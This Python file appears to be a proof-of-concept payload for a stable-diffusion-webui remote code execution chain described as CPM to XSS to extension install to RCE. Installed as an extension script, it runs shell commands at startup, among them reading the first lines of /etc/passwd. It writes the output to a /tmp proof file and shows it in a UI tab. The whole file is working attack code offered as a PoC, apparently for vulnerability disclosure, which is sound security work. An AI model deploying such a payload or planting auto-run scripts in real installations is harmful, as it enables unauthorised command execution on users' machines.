import subprocess
from modules import script_callbacks
import gradio as gr

_proof_path = "/tmp/sdwebui_cpm_rce_proof.txt"

_out = subprocess.check_output(
    "id && uname -a && hostname && echo '[RCE] stable-diffusion-webui CPM->RCE proof' && cat /etc/passwd | head -3",
    shell=True, stderr=subprocess.STDOUT, text=True
)

with open(_proof_path, "w") as f:
    f.write("[PATH] stable-diffusion-webui CPM -> XSS -> extension install -> RCE\n")
    f.write("[TRIGGER] scripts/rce_poc.py loaded at webui startup\n\n")
    f.write(_out)

print(f"[CPM-RCE-POC] Proof written to {_proof_path}")
print(_out)


def on_ui_tabs():
    with gr.Blocks() as demo:
        gr.Markdown("## CPM RCE PoC — stable-diffusion-webui")
        gr.Textbox(
            value=_out,
            label="OS Command Output (id && uname -a && hostname)",
            lines=12,
            interactive=False,
        )
        gr.Markdown(f"Proof file: `{_proof_path}`")
    return [(demo, "CPM RCE PoC", "cpm_rce_poc")]


script_callbacks.on_ui_tabs(on_ui_tabs)
